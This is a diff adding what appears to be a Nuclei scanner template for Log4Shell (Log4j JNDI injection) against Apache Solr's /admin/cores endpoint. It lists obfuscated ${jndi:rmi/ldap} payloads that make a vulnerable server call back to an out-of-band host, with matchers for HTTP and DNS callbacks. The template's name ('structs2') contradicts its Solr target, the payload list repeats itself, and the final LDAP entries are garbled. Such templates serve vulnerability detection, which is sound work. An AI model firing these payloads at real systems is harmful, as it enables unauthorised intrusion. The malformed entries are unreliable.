@@ -1,0 +1,51 @@
+id: log4j-fuzz-head-poc
+
+info:
+  name: log4j-rce-structs2
+  author: dr34d
+  severity: critical
+  tags: apache solr,rce
+
+requests:
+  - raw:
+      - |
+        GET /admin/cores?action=CREATE&name={{log4j_payloads}}&wt=json HTTP/1.1
+        Host: {{Hostname}}
+
+
+      - |
+        POST /admin/cores?action=CREATE&name={{log4j_payloads}}&wt=json HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      log4j_payloads:
+        - '$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7B::-j%7Dndi:rmi://{{interactsh-url}}/ass%7D'
+        - '$%7Bjndi:rmi://{{interactsh-url}}%7D'
+        - '$%7B$%7Blower:jndi%7D:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:$%7Blower:jndi%7D%7D:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:j%7D$%7Blower:n%7D$%7Blower:d%7Di:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:j%7D$%7Bupper:n%7D$%7Blower:d%7D$%7Bupper:i%7D:$%7Blower:r%7Dm$%7Blower:i%7D%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7B::-j%7Dndi:rmi://{{interactsh-url}}/ass%7D'
+        - '$%7Bjndi:rmi://{{interactsh-url}}%7D'
+        - '$%7B$%7Blower:jndi%7D:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:$%7Blower:jndi%7D%7D:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:j%7D$%7Blower:n%7D$%7Blower:d%7Di:$%7Blower:rmi%7D://{{interactsh-url}}/poc%7D'
+        - '$%7B$%7Blower:j%7D$%7Bupper:n%7D$%7Blower:d%7D$%7Bupper:i%7D:$%7Blower:r%7Dm$%7Blower:i%7D%7D://{{interactsh-url}}/poc%7D'
+        - 'ldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type $%7Bjndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info%7D'
+        - 'ldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type $%7Bjndildap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Typeldapldap://{{interactsh-url}}/cn=JndiExploit,dc=apache,dc=org?Type=A Type//{{interactsh-url}}/info%7D'
+    attack: clusterbomb
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
